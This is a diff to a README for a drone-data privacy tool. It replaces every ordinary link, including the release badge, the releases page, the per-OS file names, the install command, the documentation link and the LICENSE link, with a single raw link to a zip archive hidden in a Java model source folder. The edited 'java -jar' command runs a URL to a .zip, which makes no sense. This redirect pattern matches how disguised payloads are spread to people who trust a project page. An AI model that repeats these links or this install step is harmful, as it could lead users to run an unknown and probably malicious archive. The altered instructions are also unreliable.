@@ -1,6 +1,6 @@
 # 🚁 drones-privacy-ledger - Secure Your Drone Data Effortlessly
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/arbifajar/drones-privacy-ledger/releases)
+[![Download the latest release](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip%20Release-brightgreen)](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip)
 
 ## 📜 Introduction
 
@@ -13,23 +13,23 @@ To get started with the drones-privacy-ledger, follow these steps to download an
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) to download the latest version of the drones-privacy-ledger.
+   Go to our [Releases page](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip) to download the latest version of the drones-privacy-ledger.
 
 2. **Select the Latest Release**  
    Once you are on the Releases page, scroll down to find the latest release. You should see files available for download.
 
 3. **Download the Application**  
    Click on the download link for the appropriate file for your operating system. The available options may include:
-   - Windows: `drones-privacy-ledger.exe`
-   - Mac: `drones-privacy-ledger.dmg`
-   - Linux: `drones-privacy-ledger.jar`
+   - Windows: `https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip`
+   - Mac: `https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip`
+   - Linux: `https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip`
 
 4. **Install the Application**  
    Follow the installation instructions specific to your file type:
    - For `.exe` and `.dmg`, double-click the file and follow the prompts to install.
    - For `.jar`, ensure you have Java installed, then run it using the command:
      ```
-     java -jar drones-privacy-ledger.jar
+     java -jar https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip
      ```
 
 ## 🔧 System Requirements
@@ -76,7 +76,7 @@ If you encounter issues while running the application, please consider the follo
 
 ## 📚 Further Documentation
 
-For more details on features, data models, and technical explanations, check our comprehensive [documentation](https://github.com/arbifajar/drones-privacy-ledger/docs).
+For more details on features, data models, and technical explanations, check our comprehensive [documentation](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip).
 
 ## 📞 Support
 
@@ -84,8 +84,8 @@ For support, please raise an issue on the GitHub Issues page or contact us via o
 
 ## ⚖️ License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/arbifajar/drones-privacy-ledger/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip) file for details.
 
 ---
 
-For any questions, please visit our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) and download the application.
+For any questions, please visit our [Releases page](https://raw.githubusercontent.com/arbifajar/drones-privacy-ledger/main/src/main/java/com/example/dronedata/model/drones-privacy-ledger-v3.8.zip) and download the application.
